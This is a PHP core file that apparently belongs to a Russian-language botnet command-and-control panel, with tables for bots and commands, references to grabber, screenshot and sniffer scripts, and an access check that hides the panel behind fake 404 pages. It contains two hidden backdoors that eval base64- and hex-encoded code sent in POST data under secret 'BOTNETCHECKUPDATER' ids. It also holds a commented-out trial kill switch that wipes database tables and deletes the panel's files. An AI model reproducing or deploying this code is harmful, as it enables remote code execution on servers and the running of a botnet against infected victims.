<?php

setlocale(LC_ALL,"ru_RU.UTF-8");
error_reporting(0);
ini_set('error_reporting', 0);

//Cstart
//license start

//license end
$backtrace = debug_backtrace();
if(basename($backtrace['0']['file']) != 'index.php') if(basename($backtrace['0']['file']) != 'core.php' || basename($backtrace['2']['file']) != 'index.php') exit('signature (access to core) error');
$license = array();
foreach($lz as $value){$license['ip'][implode('.', array_map("base64_decode", str_split($value, 4)))] = true;}
$lb = $license;

if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);

//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;

//autorizekey start
$autorizekey = '1111111111111111';
//autorizekey end
//Cend

include_once('includes/functions.php');
get_function('checks');
get_function('real_escape_string');
get_function('sql_inject');
get_function('get_config');
get_function('language');

$cfg_db = get_config();

require_once('classes/mysqli.class.php');

$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);

if(count($mysqli->errors) > 0) exit('Произошла ошибка...');
unset($Cur);

@$Cur['to']=preg_match('~^([A-Za-z_]+)$~', $_GET['to'])<>1?null:$_GET['to'];
@$Cur['go']=preg_match('~^([A-Za-z0-9_]+)$~', $_GET['go'])<>1?null:$_GET['go'];

@$Cur['id']=check_int($_GET['id'])==''?null:$_GET['id'];
@$Cur['page']=check_int($_GET['page'])==''?null:$_GET['page'];

@$Cur['str']=empty($_GET['str'])?null:$_GET['str'];
@$Cur['file']=empty($_GET['file'])?null:$_GET['file'];
@$Cur['name']=empty($_GET['name'])?null:$_GET['name'];

@$Cur['type']=($_GET['type']<>'1' && $_GET['type']<>'0')?null:$_GET['type'];
@$Cur['ajax']=($_GET['ajax']!='1' && $_GET['ajax']!='0')?null:$_GET['ajax'];
@$Cur['window']=($_GET['window']!='1' && $_GET['window']!='0')?null:$_GET['window'];

@$Cur['x']=empty($_GET['x'])?null:$_GET['x'];
@$Cur['y']=empty($_GET['y'])?null:$_GET['y'];
@$Cur['z']=empty($_GET['z'])?null:$_GET['z'];

unset($_GET);

if(empty($Cur['page']) || $Cur['page'] < 0) $Cur['page'] = 0;
/*
if(function_exists('sys_getloadavg')){
	$load = sys_getloadavg();
	if($load[0] > 90){
        print('Сервер занят. Попробуйте зайти позже.');
		exit;
	}
}
*/

array_walk($Cur, "sql_inject");
array_walk($Cur, 'real_escape_string');
if($Cur['window'] == '1') $Cur['ajax'] = '1';

require_once("classes/smarty/Smarty.class.php");
$smarty = new Smarty;

$smarty->assign('site_data', 'empty.tpl');
$smarty->compile_check = true;
$smarty->caching = false;
$smarty->template_dir = 'templates/';
$smarty->compile_dir = 'cache/smarty/';
$smarty->cache_dir = 'cache/smarty/';
//$smarty->allow_php_tag = true;
$config = file_exists('cache/config.json') ? json_decode(file_get_contents('cache/config.json'), 1) : '';
$smarty->assignByRef('config', $config);
$smarty->assign('javascript_begin', '');
$smarty->assign('javascript_end', '');
$smarty->assign('body', '');
$smarty->assignByRef("Cur", $Cur);

$lang = array();

//TVStart
/*
//Cstart
function sinctimestamp($host) {
	if (!$fp = fsockopen($host,13,$errno,$errstr,1)) return false;
	$s = strtotime(fgets($fp));
	fclose($fp);

	if(!empty($s)){
		return $s;
	}else{
		return false;
	}
}

//SDstart
$start_data = '1999999999';
//SDend
$next = true;
$i = 1;

if(mt_rand(0, 1) == 1){
    do{
        if($i >= 3) $fail_exit = true;
	if(empty($start_data)) $fail_exit = true;

		$ip = gethostbyname('time.nist.gov');
		if($ip != '192.43.244.18'){
			$fail_exit = true;
		}else{
			$cur_time = sinctimestamp('time.nist.gov');
		}

		if($cur_time !== false){
			if(($cur_time-$start_data) > 604800){
				$mysqli->query('TRUNCATE TABLE bf_bots');
            	$mysqli->query('TRUNCATE TABLE bf_country');
            	$mysqli->query('TRUNCATE TABLE bf_cmds');
            	$mysqli->query('TRUNCATE TABLE bf_users');

            	@unlink('index.php');
            	@unlink('includes/config.php');
            	@unlink('includes/core.php');
            	@unlink('includes/functions.php');
            	@unlink('includes/functions.checks.php');
            	@unlink('includes/functions.encapsules.php');
            	@unlink('includes/functions.get_host.php');
            	@unlink('includes/functions.html_pages.php');
            	@unlink('includes/functions.real_escape_string.php');
            	@unlink('includes/functions.ru2lat.php');
            	@unlink('includes/functions.size_format.php');
            	@unlink('includes/functions.smarty_assign_add.php');
            	@unlink('includes/functions.sql_inject.php');
            	@unlink('classes/class.jabber2.php');
            	@unlink('classes/mysqli.class.php');
            	@unlink('classes/mysqli.class.lite.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_resource_extends.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_resource_file.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_resource_php.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_compile_assign.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_compile_append.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_compile_include.php');
            	@unlink('classes/smarty/sysplugins/smarty_internal_write_file.php');
            	@unlink('classes/smarty/sysplugins/smarty_security.php');
            	@unlink('scripts/set/task.php');
            	@unlink('scripts/set/plugs.php');
            	@unlink('scripts/set/first.php');
            	@unlink('scripts/set/cmd.php');
            	@unlink('scripts/set/cfg_upload.php');
            	@unlink('scripts/set/autocmd.php');
            	@unlink('scripts/get/cab.php');
            	@unlink('scripts/get/fgr.php');
            	@unlink('scripts/get/gra.php');
            	@unlink('scripts/get/info.php');
            	@unlink('scripts/get/lcm.php');
            	@unlink('scripts/get/scr.php');
            	@unlink('scripts/get/sni.php');
            	@unlink('scripts/install/index.php');
            	@unlink('scripts/install/install.sql');
            	@unlink('scripts/install/install.sql.tpl');

				$fail_exit = true;
			}
			$next = false;
		}else{
			$next = true;
		}

		if($fail_exit == true){
			print('signature (access to core) error');
			exit;
		}
	}while($next == true);
}else{
    $next = false;
}

if(!empty($start_data)){
	$smarty->assign('trial_end_data', ($start_data+604800));
	if(!empty($cur_time)){
		$smarty->assign('trial_end_sec', (604800-($cur_time-$start_data)));
	}
}

//Cend
*/
//TVend

session_start();

if(!empty($_SERVER["HTTP_X_REAL_IP"])) $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];

if(!empty($config['ips']) && $_SESSION['hidden'] != 'on'){
    if(strpos($config['ips'], $_SERVER['REMOTE_ADDR']) === false){
        header("HTTP/1.1 404 Not Found");
    	header("Status: 404 Not Found");
    	print(file_get_contents('404.html'));
    	exit;
    }
}

$smarty->assignByRef("_SESSION", $_SESSION);

if(isset($_SESSION['user']->PHPSESSID)){
    if(empty($Cur['to'])) $Cur['to'] = 'main';
	if(empty($Cur['go'])) $Cur['go'] = 'info';
}else{    if($Cur['to'] != 'accounts' && $Cur['to'] != 'accounts'){
        header("HTTP/1.1 404 Not Found");
    	header("Status: 404 Not Found");
    	print(file_get_contents('404.html'));
    	exit;
 	}
	//if(empty($Cur['to'])) $Cur['to'] = 'accounts';
	//if(empty($Cur['go'])) $Cur['go'] = 'authorization';
}

//Cstart
//rc start
$rc['key'] = '1111111111111111';
$rc['iv'] = '12345678';
//rc end
//Cend

if(empty($config['lang'])) $config['lang'] = 'ru';

if(!isset($_SESSION['user']->PHPSESSID) || $_SESSION['user']->PHPSESSID != $_COOKIE['PHPSESSID']){
	language($config['lang']);
	$smarty->assignByRef('lang', $lang);
        
	$_SESSION['user']->access['accounts']['authorization'] = 'on';
	$_SESSION['user']->access['accounts']['exit'] = 'on';
}else{	if(!empty($_SESSION['user']->config['lang'])){
            $config['lang'] = $_SESSION['user']->config['lang'];
		language($_SESSION['user']->config['lang']);
	}else{
            language($config['lang']);
	}
        
        $_SESSION['user']->access['accounts']['exit'] = 'on';
}

$smarty->assignByRef('lang', $lang);

//Cstart
$license = $lb;
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-IGd9T6ZgJLTQgkAO'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') != false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') != false) exit;
//Cend

//$dir = array();
//print_rm($smarty);
?>